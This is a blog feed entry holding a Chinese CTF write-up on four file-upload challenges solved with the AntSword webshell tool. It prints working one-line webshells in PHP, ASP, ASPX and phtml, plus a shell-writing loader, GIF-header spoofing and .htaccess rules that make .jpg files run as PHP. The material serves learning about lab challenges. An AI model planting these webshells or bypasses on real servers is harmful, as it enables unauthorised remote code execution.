{
    "version": "https://jsonfeed.org/version/1",
    "title": "imFanqie • All posts by \"upload及蚁剑运用\" category",
    "description": "学习博客",
    "home_page_url": "http://imfanqie.top",
    "items": [
        {
            "id": "http://imfanqie.top/2021/08/02/ctf/web/upload/(ctfwp)upload%E7%B1%BB%E9%A2%98%E7%9B%AE%E5%8F%8A%E8%9A%81%E5%89%91%E7%9A%84%E8%BF%90%E7%94%A8/",
            "url": "http://imfanqie.top/2021/08/02/ctf/web/upload/(ctfwp)upload%E7%B1%BB%E9%A2%98%E7%9B%AE%E5%8F%8A%E8%9A%81%E5%89%91%E7%9A%84%E8%BF%90%E7%94%A8/",
            "title": "(ctfwp)upload类题目及蚁剑的运用",
            "date_published": "2021-08-02T13:26:51.812Z",
            "content_html": "<p>无聊刷题的时候遇到了点麻烦，经过学习后，认识了下中国蚁剑这款 np 的工具。</p>\n<p>结果没想到又遇到了 upload 类的题目，正好又用到了。。</p>\n<p>晕了，那就写一下，以后方便复习吧。</p>\n<p><span id=\"more\"></span></p>\n<hr>\n<p>先从最简单的写起：</p>\n<h1 id=\"1极客大挑战-2019knife\"><a class=\"anchor\" href=\"#1极客大挑战-2019knife\">#</a> 1.[极客大挑战 2019] Knife</h1>\n<p>进去后就一个界面，再无数尝试后学习了下别人的 wp：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMDIvUFg4cjQ1S0hpbkFnbWtjLnBuZw==\">https://i.loli.net/2021/08/02/PX8r45KHinAgmkc.png</span>&quot; alt=&quot;1.png&quot; style=&quot;zoom:33%;&quot; /&gt;&lt;!--p1--&gt;</p>\n<p>现在看来，确实提示的非常明显</p>\n<p>1. 题目为 knife，可以想到 <strong>中国菜刀</strong> 这个软件，他是 <strong>中国蚁剑</strong> 的前辈了。</p>\n<p>2. 中间有很明显得 一句话木马 的代码提示，可惜当时我还不知道。</p>\n<p>折腾半天后用 蚁剑 成功连接上网站，查看目录，flag 在根目录：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMDIvUmhXMkxzR3BBOHdvbktqLnBuZw==\">https://i.loli.net/2021/08/02/RhW2LsGpA8wonKj.png</span>&quot; alt=&quot;2.png&quot; style=&quot;zoom:33%;&quot; /&gt;&lt;!--p2--&gt;</p>\n<hr>\n<h1 id=\"2actf2020-新生赛upload\"><a class=\"anchor\" href=\"#2actf2020-新生赛upload\">#</a> 2.[ACTF2020 新生赛] Upload</h1>\n<p>这道题稍微多了一点点难度：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMDIvamhRbDRnTVB4WE9xRVI4LnBuZw==\">https://i.loli.net/2021/08/02/jhQl4gMPxXOqER8.png</span>&quot; alt=&quot;3.png&quot; style=&quot;zoom:33%;&quot; /&gt;&lt;!--p3--&gt;</p>\n<p>1. 加了上传文件这个功能，查资料后我了解到了这类题的解题方法。</p>\n<p>2. 只能上传图片，无法直接解析代码，不能直接上传 php 来执行，需要绕过。</p>\n<p>3. 要学习一下 一句话木马。</p>\n<p>所以这里先复习一常用的一句话木马（原理、介绍太多就不写了）</p>\n<hr>\n<h2 id=\"一句话木马\"><a class=\"anchor\" href=\"#一句话木马\">#</a> 一句话木马</h2>\n<p>最简单的一句话木马：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>php的一句话是:    <span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> @<span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'flag'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><pre><code class=\"language-asp\">asp的一句话是：   &lt;%eval request (&quot;pass&quot;)%&gt;\n</code></pre>\n<pre><code class=\"language-aspx\">aspx的一句话是：  &lt;%@ Page Language=&quot;Jscript&quot;%&gt; &lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt;\n</code></pre>\n<pre><code class=\"language-php+HTML\">phtml的一句话是:  &lt;script language=&quot;php&quot;&gt;eval($_POST['flag']);&lt;/script&gt;\n\t\t\t\t&lt;?php @eval($_POST['flag']);?&gt;\n</code></pre>\n<p>第一个和第四个最常用，实测 [ ] 里面不用引号 ‘ ’ 也行。</p>\n<p>* 如果是图片还可以（我还没试成功过，但是有这个方法）:</p>\n<p>上传一个名字为 wooyun.jpg，内容为</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?PHP</span> <span class=\"token function\">fputs</span><span class=\"token punctuation\">(</span><span class=\"token function\">fopen</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'shell.php'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'w'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'&lt;?php eval($_POST[cmd])?>'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>的文件，然后访问 wooyun.jpg/.php, 在这个目录下就会生成一句话木马 shell.php</p>\n<hr>\n<p>继续本题 &gt;&gt;</p>\n<p>思路：先假装传图片，然后改格式为 php 或者其他的几个</p>\n<p>在本地写一个 txt，用 php 的一句话，后缀改为 jpg 传入，同时用 burp 抓包：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMDIvZlpUOHAzeW5YSXhyUGprLnBuZw==\">https://i.loli.net/2021/08/02/fZT8p3ynXIxrPjk.png</span>&quot; alt=&quot;4.png&quot; style=&quot;zoom: 50%;&quot; /&gt;&lt;!--p4--&gt;</p>\n<p>然后改后缀，文件格式保持不变，经过尝试，php 会报错，用 phtml 可以成功上传：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMDIvdGZJVjZUTlh6RHdFQWRQLnBuZw==\">https://i.loli.net/2021/08/02/tfIV6TNXzDwEAdP.png</span>&quot; alt=&quot;5.png&quot; style=&quot;zoom: 50%;&quot; /&gt;&lt;!--p5--&gt;</p>\n<p>根据 unload 的位置，链接蚁剑，登录，在根目录获取 flag：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMDIvaHhmVzQ5dXplMTdBbEt3LnBuZw==\">https://i.loli.net/2021/08/02/hxfW49uze17AlKw.png</span>&quot; alt=&quot;6.png&quot; style=&quot;zoom:33%;&quot; /&gt;&lt;!--p6--&gt;</p>\n<hr>\n<h1 id=\"3极客大挑战-2019upload\"><a class=\"anchor\" href=\"#3极客大挑战-2019upload\">#</a> 3.[极客大挑战 2019] Upload</h1>\n<p>本题也是，只能上传图片格式，思路同上题一样，传一个 一句话木马 。</p>\n<p>本地写好后，抓包，改后缀 phtml（php 被 ban 了），发现 &lt;? 也被 ban 了：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMDIvRWVBZ25TSmNSbWR6SXRGLnBuZw==\">https://i.loli.net/2021/08/02/EeAgnSJcRmdzItF.png</span>&quot; alt=&quot;7.png&quot; style=&quot;zoom: 50%;&quot; /&gt;&lt;!--p7--&gt;</p>\n<p>试一下上面的第一个代码：</p>\n<pre><code class=\"language-php+HTML\">&lt;script language=&quot;php&quot;&gt;eval($_POST['flag']);&lt;/script&gt;\n</code></pre>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMDIvY2I3cnVHZXFvNFVwMVRCLnBuZw==\">https://i.loli.net/2021/08/02/cb7ruGeqo4Up1TB.png</span>&quot; alt=&quot;8.png&quot; style=&quot;zoom: 50%;&quot; /&gt;&lt;!--p8--&gt;</p>\n<p>发现还是能检测不是图片，在语句前加一个  <code>GIF86a</code>  伪装一下：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMDIvNHlJdVFQWmhZSDFWS3p3LnBuZw==\">https://i.loli.net/2021/08/02/4yIuQPZhYH1VKzw.png</span>&quot; alt=&quot;9.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--p9--&gt;</p>\n<p>可以发现成功上传，因为没有具体回显地址，又根据网址后面的后缀，可以猜测应该是上传到 upload 中：</p>\n<p><img data-src=\"https://i.loli.net/2021/08/02/jeQoCLwqA3vm5sn.png\" alt=\"10.png\">&lt;!--p10--&gt;</p>\n<p>果然，直接打开蚁剑：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMDIvWkNWa3ppdzFwbVdkU0h2LnBuZw==\">https://i.loli.net/2021/08/02/ZCVkziw1pmWdSHv.png</span>&quot; alt=&quot;11.png&quot; style=&quot;zoom:33%;&quot; /&gt;&lt;!--p11--&gt;</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMDIvWWpmVWlKdkk2Q2xtRmVuLnBuZw==\">https://i.loli.net/2021/08/02/YjfUiJvI6ClmFen.png</span>&quot; alt=&quot;12.png&quot; style=&quot;zoom:33%;&quot; /&gt;&lt;!--p12--&gt;</p>\n<hr>\n<h1 id=\"4mrctf2020你传你呢\"><a class=\"anchor\" href=\"#4mrctf2020你传你呢\">#</a> 4.[MRCTF2020] 你传你🐎呢</h1>\n<p>这题前面的流程，思路和 2 一样，先伪造上传，然后改后缀</p>\n<p>但是再多次尝试后发现改后缀依旧被 ban，采用 3 的方法还是被 ban, 只能上传图片：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMDIvSjQ2SUNrSHRVeUJYcVB3LnBuZw==\">https://i.loli.net/2021/08/02/J46ICkHtUyBXqPw.png</span>&quot; alt=&quot;13.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--p13--&gt;</p>\n<p>再查阅资料后，发现是需要更改 htaccess 配置，将其他类型文件转为 php 文件</p>\n<h2 id=\"htaccess\"><a class=\"anchor\" href=\"#htaccess\">#</a> <strong>htaccess</strong></h2>\n<pre><code class=\"language-txt\">.htaccess可以帮我们实现包括：文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表，以及使用其他文件作为index文件等一些功能\n</code></pre>\n<p>将下面的内容写入 .htaccess（注意没有名字，直接.htaccess!!!）</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">&lt;</span>FilesMatch <span class=\"token string\">\"flag.jpg\"</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>SetHandler application/x-httpd-php</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">&lt;</span>/FilesMatch<span class=\"token operator\">></span></pre></td></tr></table></figure><p>第一行要保证与需修改的文件同名</p>\n<p>（这个也行，这个意思是将 jpg 全当成 php）（注意没有名字，直接.htaccess!!!）</p>\n<pre><code>AddType application/x-httpd-php .jpg\n</code></pre>\n<p>随便选一个上传</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMDIveVUzY2diNnpTbmRIVEJSLnBuZw==\">https://i.loli.net/2021/08/02/yU3cgb6zSndHTBR.png</span>&quot; alt=&quot;14.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--p14--&gt;</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMDIvZnpUOUFsVk1STFp0UGp2LnBuZw==\">https://i.loli.net/2021/08/02/fzT9AlVMRLZtPjv.png</span>&quot; alt=&quot;15.png&quot; style=&quot;zoom:33%;&quot; /&gt;&lt;!--p15--&gt;</p>\n<hr>\n<p>END</p>\n",
            "tags": [
                "upload"
            ]
        }
    ]
}